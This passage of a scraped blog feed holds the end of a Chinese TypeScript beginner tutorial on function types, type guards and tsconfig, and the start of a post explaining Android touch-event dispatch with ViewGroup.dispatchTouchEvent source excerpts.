<span class="hljs-keyword">const</span> multiply = (<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> {
  <span class="hljs-keyword">return</span> a * b;
};

<span class="hljs-comment">// 无返回值</span>
<span class="hljs-keyword">const</span> log = (<span class="hljs-attr">msg</span>: <span class="hljs-built_in">string</span>): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(msg);
};
</code></pre>
<h3 data-id="heading-22">2. 可选参数与默认参数</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 可选参数（加 ?，必须放在必选参数后面）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age?: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`姓名：<span class="hljs-subst">${name}</span>，年龄：<span class="hljs-subst">${age || <span class="hljs-string">"未知"</span>}</span>`</span>);
}
<span class="hljs-title function_">greet</span>(<span class="hljs-string">"张三"</span>); <span class="hljs-comment">// 合法</span>
<span class="hljs-title function_">greet</span>(<span class="hljs-string">"李四"</span>, <span class="hljs-number">30</span>); <span class="hljs-comment">// 合法</span>

<span class="hljs-comment">// 默认参数（自动推断类型，无需加 ?）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sayHi</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span> = <span class="hljs-string">"游客"</span></span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`你好，<span class="hljs-subst">${name}</span>`</span>);
}
<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// 输出：你好，游客</span>
</code></pre>
<h3 data-id="heading-23">3. 函数类型别名</h3>
<p>定义函数的 “形状”（参数类型 + 返回值类型）：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 定义函数类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">AddFn</span> = <span class="hljs-function">(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span>;

<span class="hljs-comment">// 实现函数</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">add</span>: <span class="hljs-title class_">AddFn</span> = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> x + y;
};
</code></pre>
<h2 data-id="heading-24">七、类型守卫</h2>
<p>通过代码逻辑缩小类型范围，让 TS 更精准推断类型：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// typeof 类型守卫（适用于原始类型）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">printValue</span>(<span class="hljs-params">value: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">"string"</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value.<span class="hljs-title function_">toUpperCase</span>()); <span class="hljs-comment">// TS 知道这里 value 是 string</span>
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value.<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>)); <span class="hljs-comment">// TS 知道这里 value 是 number</span>
  }
}

<span class="hljs-comment">// instanceof 类型守卫（适用于类实例）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {}
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-title function_">bark</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"汪汪汪"</span>);
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">judgeAnimal</span>(<span class="hljs-params">animal: Animal</span>) {
  <span class="hljs-keyword">if</span> (animal <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Dog</span>) {
    animal.<span class="hljs-title function_">bark</span>(); <span class="hljs-comment">// TS 知道这里 animal 是 Dog 实例</span>
  }
}
</code></pre>
<h2 data-id="heading-25">八、TS 配置文件（tsconfig.json）</h2>
<p>项目中通过 <code>tsconfig.json</code> 配置 TS 编译规则，执行 <code>tsc --init</code> 生成默认配置，核心配置说明：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"compilerOptions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"target"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ES6"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 编译目标 JS 版本（ES5/ES6/ESNext）</span>
    <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ESNext"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 模块系统（CommonJS/ESModule）</span>
    <span class="hljs-attr">"outDir"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 编译后的 JS 文件输出目录</span>
    <span class="hljs-attr">"rootDir"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./src"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 源文件目录</span>
    <span class="hljs-attr">"strict"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 开启严格模式（推荐，强制类型检查）</span>
    <span class="hljs-attr">"noImplicitAny"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 禁止隐式 any 类型</span>
    <span class="hljs-attr">"esModuleInterop"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-comment">// 兼容 CommonJS 和 ESModule</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"include"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"./src/**/*"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 要编译的文件</span>
  <span class="hljs-attr">"exclude"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"node_modules"</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// 排除的文件</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-26">九、新手避坑指南</h2>
<ol>
<li><strong>不要滥用 any</strong>：用 <code>unknown</code> 替代 any，保留类型检查；</li>
<li><strong>可选参数放最后</strong>：TS 要求可选参数必须在必选参数之后；</li>
<li><strong>元组 push 不报错</strong>：元组虽固定长度，但 push 不会触发 TS 报错，需手动规避；</li>
<li><strong>严格模式必开</strong>：<code>strict: true</code> 能暴露更多潜在问题，是 TS 核心价值所在；</li>
<li><strong>类型断言要谨慎</strong>：<code>as</code> 语法是 “告诉 TS 我比你更清楚类型”，滥用会导致类型不安全。</li>
</ol>
<h2 data-id="heading-27">总结</h2>
<ol>
<li>TS 核心是<strong>静态类型系统</strong>，通过类型注解 / 推断提前规避错误；</li>
<li>常用基础类型：原始类型、数组、元组、any/unknown、void/never，需掌握各自使用场景；</li>
<li>定义对象结构优先用 <code>interface</code>，其他类型约束用 <code>type</code>；</li>
<li>函数注解要关注参数、返回值、可选参数，类型守卫能提升类型推断精度；</li>
<li>项目中务必开启严格模式（<code>strict: true</code>），发挥 TS 最大价值。</li>
</ol>
<p>从 JS 过渡到 TS 无需一步到位，可先在项目中局部使用，逐步覆盖，重点是理解 “类型” 的核心思想，而非死记语法。掌握本文的基础知识，足以应对日常开发中 80% 的 TS 场景，后续可再深入泛型、装饰器、高级类型等内容。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android事件分发逻辑--针对事件分发相关函数的讲解]]></title>    <link>https://juejin.cn/post/7605542907118354484</link>    <guid>https://juejin.cn/post/7605542907118354484</guid>    <pubDate>2026-02-12T17:15:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605542907118354484" data-draft-id="7605537925150048308" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android事件分发逻辑--针对事件分发相关函数的讲解"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-12T17:15:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Aurora419"/> <meta itemprop="url" content="https://juejin.cn/user/4114811667877977"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android事件分发逻辑--针对事件分发相关函数的讲解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4114811667877977/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Aurora419
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T17:15:18.000Z" title="Thu Feb 12 2026 17:15:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="rainbow">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#474949;color:#d1d9e1}.hljs-comment,.hljs-quote{color:#969896;font-style:italic}.hljs-addition,.hljs-keyword,.hljs-literal,.hljs-selector-tag,.hljs-type{color:#c9c}.hljs-number,.hljs-selector-attr,.hljs-selector-pseudo{color:#f99157}.hljs-doctag,.hljs-regexp,.hljs-string{color:#8abeb7}.hljs-built_in,.hljs-name,.hljs-section,.hljs-title{color:#b5bd68}.hljs-class .hljs-title,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#fc6}.hljs-name,.hljs-section,.hljs-strong{font-weight:700}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-subst,.hljs-symbol{color:#f99157}.hljs-deletion{color:#dc322f}.hljs-formula{background:#eee8d5}.hljs-attr,.hljs-attribute{color:#81a2be}.hljs-emphasis{font-style:italic}</style><h2 data-id="heading-0">何为事件分发？</h2>
<p>声明:这是个人的学习笔记，刚学事件分发几天对事件分发的理解没有这么深请见谅
由于这篇文字是在飞书上写的所以一些颜色不对应，请见谅</p>
<p><strong>事件</strong>指的是<strong>屏幕触发事件</strong>——即Android中的<strong>TouchEvent/MotionEvent</strong>。每一次我们触摸屏幕，都会产生一连串的触摸事件，这些一连串的触摸事件合起来就是一个触摸事件序列。</p>
<p>触摸事件在Android官方API中由类MotionEvent来描述，不同的触摸事件对应不同的事件类型。事件类型分别有ACTION_DOWN、ACTION_UP、ACTION_MOVE、ACTION_CANCEL。(这里暂时不讨论多指触控)</p>
<p>那什么叫<strong>分发</strong>呢？我们都知道Android是由View树进行渲染的。假设屏幕坐标为（11，11）的区域既属于一个LinearLayout，又属于LinearLayout下的一个Button，那我这次触碰所产生的触摸事件，是该给LinearLayout还是Button呢？当然，我们很确定这次触摸事件最终会被Button所处理。<strong>那触摸事件是怎么给到Button的呢</strong>？需要经过LinearLayout吗？怎样能让Button不处理呢？这就需要我们了解触摸事件（后文统称为事件）在View树上传递与消费的过程，这就是事件的分发。</p>
<p>以下是 Android 中 <code>onTouchEvent</code> 常见的事件类型及其特性的汇总表格，以及针对各事件的深度解析。</p>
<h3 data-id="heading-1">Android 触摸事件（MotionEvent）核心概览表</h3>








































<table><thead><tr><th>事件类型 (Action)</th><th>触发条件 (Trigger Condition)</th><th>触发频率 (Frequency)</th><th>对事件流的影响</th><th>核心用途</th></tr></thead><tbody><tr><td>ACTION_DOWN</td><td>手指初次接触屏幕</td><td>仅 1 次</td><td>生死关口：若返回 false，后续事件不再传给此 View</td><td>记录起点坐标、重置状态、申明消费意向</td></tr><tr><td>ACTION_MOVE</td><td>手指在屏幕上滑动</td><td>多次 (高频)</td><td>持续更新，反映手指轨迹</td><td>计算位移、实现拖拽、判断是否触发滑动阈值</td></tr><tr><td>ACTION_UP</td><td>手指离开屏幕</td><td>仅 1 次</td><td>正常终点：标志整个手势序列圆满结束</td><td>触发点击事件 (onClick)、执行回弹动画</td></tr><tr><td>ACTION_CANCEL</td><td>事件流被父布局拦截</td><td>最多 1 次</td><td>非正常终点：强制终止当前 View 的事件处理</td><td>状态重置（如取消按钮高亮），防止逻辑出错</td></tr></tbody></table>
<h4 data-id="heading-2">事件详细解析</h4>
<p><strong>ACTION_DOWN：事件流的“敲门砖”</strong></p>
<ul>
<li>
<p><strong>触发条件</strong>：这是所有触摸事件的源头。每当一根手指接触屏幕时触发。</p>
</li>
<li>
<p><strong>消费机制</strong>：这是 View 唯一一次能决定“要不要处理这个序列”的机会。</p>
<ul>
<li><strong>如果你在</strong> <strong><code>ACTION_DOWN</code></strong> <strong>时返回了</strong> <strong><code>false</code></strong> <strong>，系统会认为你对这个任务不感兴趣，接下来的</strong> <strong><code>MOVE</code></strong> <strong>、</strong> <strong><code>UP</code></strong> <strong>统统不会再发给你</strong>。</li>
<li><strong>比喻</strong>：就像公司的派活，如果你拒绝了开头，那后续所有的进度汇报和结尾都没你的事了。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-3">ACTION_MOVE：高频的“过程量”</h4>
<ul>
<li>
<p><strong>触发条件</strong>：只要手指按下后在屏幕上移动，甚至是微小的抖动。</p>
</li>
<li>
<p><strong>多次触发</strong>：它的触发频率极高（通常 16ms 或 8ms 一次，取决于屏幕刷新率）[每刷新一次屏幕就需要计算两次的位移差]。</p>
</li>
<li>
<p><strong>注意事项</strong>：</p>
<ul>
<li><strong>性能</strong>：不要在 <code>MOVE</code> 里面写大量的计算逻辑、创建大量对象或进行数据库操作，否则会导致 UI 卡顿。</li>
<li><strong>阈值 (TouchSlop)</strong> ：通常我们会判断滑动距离是否超过系统定义的 <code>mTouchSlop</code>（通常是 8dp 左右），来决定这是不是一次有效的“滑动”，还是只是手指的轻微震颤。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-4">ACTION_UP：完美的“收尾”</h4>
<ul>
<li>
<p><strong>触发条件</strong>：最后一根手指离开屏幕。</p>
</li>
<li>
<p><strong>逻辑处理</strong>：</p>
<ul>
<li>Android 的 <code>onClick</code>（点击监听）就是在 <code>UP</code> 里面判断的。如果手指按下到抬起的位移很小，且时长符合要求，系统就会在内部调用 <code>performClick()</code>。</li>
<li>它是释放资源、结束动画的最佳时机。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-5">ACTION_CANCEL：无奈的“被截胡”</h4>
<ul>
<li>
<p><strong>触发条件</strong>：这个事件比较特殊，它不是由用户直接触发的，而是由<strong>父布局</strong>产生的。</p>
<ul>
<li><strong>典型场景</strong>：你在一个 <code>RecyclerView</code>（列表）里按住了一个按钮，刚开始触发了 <code>DOWN</code>。但接着你向上滑动，父容器 <code>RecyclerView</code> 觉得你要滚动列表，于是它强行拦截了事件（<code>onInterceptTouchEvent</code> 返回 <code>true</code>）。</li>
<li>此时，按钮会收到一个 <code>ACTION_CANCEL</code>，告诉它：“活儿被老板接管了，你洗洗睡吧。”</li>
</ul>
</li>
<li>
<p><strong>重要性</strong>：View 收到此事件时必须<strong>重置状态</strong>。比如按钮本来是按压变色的，收到 <code>CANCEL</code> 后必须变回原色，否则按钮会一直卡在“按下”的状态。</p>
</li>
</ul>
<p><strong>也就是说事件从触摸开始，经历滑动，最后以手指抬起结果。也就是说DOWN事件是其他事件的开始没有DOWN事件就没有其他事件的发生</strong></p>
<h2 data-id="heading-6">事件分发的关键函数</h2>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">dispatchTouchEvent</span>()、<span class="hljs-built_in">onInterceptTouchEvent</span>()、<span class="hljs-built_in">onTouchEvent</span>()
</code></pre>
<h2 data-id="heading-7">dispatchTouchEvent</h2>
<p>负责分发事件，View和ViewGroup上有不同的表现</p>
<p>ViewGroup的dispatchTouchEvent会向子View分发事件，如果子View不处理再交给父View处理，此时也会调用ViewGroup父View的disptachTouchEvent方法(ViewGroup继承于View,此时调用的是父类的方法）</p>
<h3 data-id="heading-8">ViewGroup的dispatchTouchEvent</h3>
<p><strong>dispatchTouchEvent是一个返回</strong> <strong>布尔值</strong> <strong>的函数，通过返回临时变量handled值，默认赋值为false</strong></p>
<p><strong>对于DOWN,MOVE,UP事件的会进入不同的分发链</strong></p>
<p>了解分发链前我们需要重点关注的几个变量</p>
<p>intercepted-&gt;判断是否需要拦截</p>
<pre><code class="hljs language-ini" lang="ini">final boolean intercepted<span class="hljs-comment">;</span>
if (<span class="hljs-attr">actionMasked</span> == MotionEvent.ACTION_DOWN
        || mFirstTouchTarget != null) {
        //这个标黄的标志位，是后面内部拦截法requestDisallowInterceptTouchEvent() 的关键
    final boolean <span class="hljs-attr">disallowIntercept</span> = (mGroupFlags &amp; FLAG_DISALLOW_INTERCEPT) != <span class="hljs-number">0</span><span class="hljs-comment">;</span>
    if (!disallowIntercept) {
    //这里调用onInterceptTouchEvent方法
        <span class="hljs-attr">intercepted</span> = <span class="hljs-literal">on</span>InterceptTouchEvent(ev)<span class="hljs-comment">;</span>
        ev.setAction(action)<span class="hljs-comment">; // restore action in case it was changed</span>
    } else {
        <span class="hljs-attr">intercepted</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
    }
} else {

    <span class="hljs-attr">intercepted</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
}
</code></pre>
<p>mFirstTouchTarget-&gt;消费DOWN事件子View的位置</p>
<p>newTouchTarget-&gt;新手指的触摸位置</p>
<h4 data-id="heading-9"><strong>DOWN事件在dispatchTouchEvent主要流程</strong></h4>
<pre><code class="hljs language-ini" lang="ini">TouchTarget <span class="hljs-attr">newTouchTarget</span> = null<span class="hljs-comment">;//每次循环前清空</span>
boolean <span class="hljs-attr">alreadyDispatchedToNewTouchTarget</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;//注意这个参数</span>
final boolean <span class="hljs-attr">canceled</span> = resetCancelNextUpFlag(this)
        || <span class="hljs-attr">actionMasked</span> == MotionEvent.ACTION_CANCEL<span class="hljs-comment">;</span>
if (!canceled &amp;&amp; !intercepted) {

    View <span class="hljs-attr">childWithAccessibilityFocus</span> = ev.isTargetAccessibilityFocus()
            ? findChildWithAccessibilityFocus() : null<span class="hljs-comment">;</span>

    if (<span class="hljs-attr">actionMasked</span> == MotionEvent.ACTION_DOWN
|| (split &amp;&amp; <span class="hljs-attr">actionMasked</span> == MotionEvent.ACTION_POINTER_DOWN)
            || <span class="hljs-attr">actionMasked</span> == MotionEvent.ACTION_HOVER_MOVE) {
        final int <span class="hljs-attr">actionIndex</span> = ev.getActionIndex()<span class="hljs-comment">; // always 0 for down</span>
        final int <span class="hljs-attr">idBitsToAssign</span> = split ? <span class="hljs-number">1</span> &lt;&lt; ev.getPointerId(actionIndex)
                : TouchTarget.ALL_POINTER_IDS<span class="hljs-comment">;</span>

        removePointersFromTouchTargets(idBitsToAssign)<span class="hljs-comment">;</span>

        final int <span class="hljs-attr">childrenCount</span> = mChildrenCount<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">newTouchTarget</span> == null &amp;&amp; childrenCount != <span class="hljs-number">0</span>) {
            final float <span class="hljs-attr">x</span> = ev.getXDispatchLocation(actionIndex)<span class="hljs-comment">;</span>
            final float <span class="hljs-attr">y</span> = ev.getYDispatchLocation(actionIndex)<span class="hljs-comment">;</span>
         
            final ArrayList&lt;View&gt; <span class="hljs-attr">preorderedList</span> = buildTouchDispatchChildList()<span class="hljs-comment">;</span>
            final boolean <span class="hljs-attr">customOrder</span> = preorderedList == null
                    &amp;&amp; isChildrenDrawingOrderEnabled()<span class="hljs-comment">;</span>
            final View<span class="hljs-section">[]</span> <span class="hljs-attr">children</span> = mChildren<span class="hljs-comment">;</span>
            //从右往左遍历
            for (int <span class="hljs-attr">i</span> = childrenCount - <span class="hljs-number">1</span><span class="hljs-comment">; i &gt;= 0; i--) {</span>
                final int <span class="hljs-attr">childIndex</span> = getAndVerifyPreorderedIndex(
                        childrenCount, i, customOrder)<span class="hljs-comment">;</span>
                final View <span class="hljs-attr">child</span> = getAndVerifyPreorderedView(
                        preorderedList, children, childIndex)<span class="hljs-comment">;</span>

              
                if (childWithAccessibilityFocus != null) {
                    if (childWithAccessibilityFocus != child) {
                        continue<span class="hljs-comment">;</span>
                    }
                    <span class="hljs-attr">childWithAccessibilityFocus</span> = null<span class="hljs-comment">;</span>
                    <span class="hljs-attr">i</span> = childrenCount<span class="hljs-comment">;</span>
                }

                if (!child.canReceivePointerEvents()
                        || !isTransformedTouchPointInView(x, y, child, null)) {
                    ev.setTargetAccessibilityFocus(false)<span class="hljs-comment">;</span>
                    continue<span class="hljs-comment">;</span>
                }
//如果这个手指位置已经存在会直接跳出循环
                <span class="hljs-attr">newTouchTarget</span> = getTouchTarget(child)<span class="hljs-comment">;</span>
                if (newTouchTarget != null) {
                    newTouchTarget.pointerIdBits |= idBitsToAssign<span class="hljs-comment">;</span>
                    break<span class="hljs-comment">;</span>
                }

//最关键代码
                resetCancelNextUpFlag(child)<span class="hljs-comment">;</span>
                //这个方法会调用子View的dispatchTouchevent来判断是否消费事件
                if (dispatchTransformedTouchEvent(ev, false, child, idBitsToAssign)) {
                    // Child wants to receive touch within its <span class="hljs-attr">bounds.
